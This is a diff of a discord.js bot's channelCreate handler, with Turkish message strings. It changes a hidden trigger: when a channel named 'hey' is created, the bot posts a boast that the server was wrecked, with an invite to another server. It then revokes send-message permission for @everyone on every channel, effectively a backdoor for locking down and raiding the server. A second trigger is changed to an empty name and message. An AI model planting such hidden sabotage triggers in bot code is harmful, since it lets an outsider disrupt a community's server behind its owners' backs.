@@ -413,8 +413,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'berke-abi-ne-yaptin') {
-    channel.send(`Herkes patlamak ister aynı volcano gibi :volcano: discord.gg/d2nAWtn \n\nhttps://tenor.com/view/yeah-hellyeah-anime-oh-yeah-fist-pump-gif-5388176`)
+  if (channel.name == 'hey') {
+    channel.send(`Sunucu uff olmuş neyse bunları yapanla görüşmek istersen; https://discord.gg/qBAdCQB`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -423,8 +423,8 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'berke-adamdir') {
-    channel.send(`allah çarptı`)
+  if (channel.name == '') {
+    channel.send(``)
   }
 
 });
